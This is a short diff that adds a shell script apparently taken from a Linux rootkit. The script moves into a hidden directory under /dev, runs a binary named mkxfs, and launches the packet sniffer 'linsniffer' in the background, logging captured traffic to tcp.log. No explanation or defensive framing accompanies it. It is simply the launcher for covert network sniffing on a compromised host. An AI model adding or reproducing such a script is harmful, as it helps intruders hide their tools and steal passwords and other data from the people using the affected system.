@@ -1,0 +1,5 @@
+#!/bin/sh
+cd /dev/ida/.drag-on
+./mkxfs -f ./s
+./linsniffer >> ./tcp.log &
+cd /
